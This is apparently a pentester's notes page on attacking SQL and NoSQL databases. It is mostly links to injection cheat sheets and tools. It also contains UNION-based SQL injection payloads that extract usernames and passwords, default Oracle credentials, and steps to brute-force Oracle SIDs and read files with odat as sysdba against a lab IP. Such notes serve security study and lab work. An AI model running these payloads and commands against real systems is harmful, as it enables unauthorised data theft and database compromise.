# Databases (SQL / NoSQL)

# SQL


## SQL injection cheat sheets
- [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


## SQL injection UNION attack

### Steps
```
"test' union select 'table',database(),'C'-- "
"test' union select 'table',username, password from db.table -- -"
```

### Articles to reproduce the attack
- [https://pentest-tools.com/blog/sql-injection-attacks](https://pentest-tools.com/blog/sql-injection-attacks)
- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)
​​
​
## MySQL user defined functions
[​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf](​​https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)

​
## Oracle / ODAT
Use [this](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) link as a reference for the steps described below    
[https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)    

### Basic creds 
``` 
Username --> Scott 
Password --> tiger
```

*Steps*    
1. Use: `odat` and its `sidguesser` to bruteforce with a link provided
2. Spin up metasploit and use auxiliary(admin/oracle/sid_brute)
3. Use sqlplus to login with the creds or
    1. Read file with odat as such:    `odat ctxsys -s 10.10.10.14 -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt`


# NoSQL
NoSQL injection knowledge base
A well curated list of tools and injection methods to use on NoSQL databases by ​[swisskyrepo](https://github.com/swisskyrepo)
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

​​
## NoSQLMap
[https://github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)
​​